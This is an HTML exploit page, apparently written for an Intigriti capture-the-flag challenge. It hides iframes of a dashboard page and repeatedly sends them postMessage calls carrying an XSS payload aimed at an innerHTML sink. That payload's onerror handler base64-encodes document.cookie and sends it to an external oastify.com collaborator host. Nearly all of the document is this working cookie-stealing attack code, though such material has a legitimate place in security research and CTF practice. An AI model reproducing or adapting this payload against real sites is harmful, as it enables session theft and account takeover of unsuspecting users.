<!DOCTYPE html>
<html>
<body>
    <h1>"Following the trail of coins..."</h1>
    <iframe id="target" src="http://localhost/dashboard.html" width="1" height="1" style="display:none"></iframe>

    <script>
        const collab = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
        const targetFrame = document.getElementById('target');

        targetFrame.onload = function() {
            // The payload for the innerHTML sink found in your image
            const xssPayload = `<img src=x onerror="fetch('${collab}/?flag='+btoa(document.cookie))">`;

            const message = {
                type: 'updateContent',
                widgetId: 'customReports',
                content: xssPayload
            };

            // Spam the internal origin
            setInterval(() => {
                targetFrame.contentWindow.postMessage(message, '*');
            }, 200);
        };

        // If 'localhost' fails, try the challenge domain directly in a hidden frame
        const backup = document.createElement('iframe');
        backup.src = 'https://challenge-0126.intigriti.io/dashboard.html';
        document.body.appendChild(backup);
        backup.onload = () => {
             backup.contentWindow.postMessage({
                type: 'updateContent',
                widgetId: 'customReports',
                content: `<img src=x onerror="fetch('${collab}/?backup='+btoa(document.cookie))">`
            }, '*');
        };
    </script>
</body>
</html>
